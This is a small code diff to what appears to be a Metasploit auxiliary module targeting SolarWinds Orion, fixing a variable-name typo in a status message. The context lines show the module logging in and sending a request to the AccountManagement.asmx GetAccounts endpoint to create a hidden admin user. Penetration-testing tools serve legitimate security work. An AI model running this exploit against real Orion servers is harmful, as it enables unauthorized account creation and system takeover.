@@ -74,7 +74,7 @@ class Metasploit3 < Msf::Auxiliary
     cookie = login(datastore['USERNAME'], datastore['PASSWORD'])
     username = Rex::Text.rand_text_alpha(8)
 
-    print_status("Logged in as #{dataastore['USERNAME']}, sending payload to create #{username} admin user.")
+    print_status("Logged in as #{datastore['USERNAME']}, sending payload to create #{username} admin user.")
 
     send_request_cgi({
       'uri' => normalize_uri(target_uri.path, 'Orion', 'Services', 'AccountManagement.asmx' '/GetAccounts'),
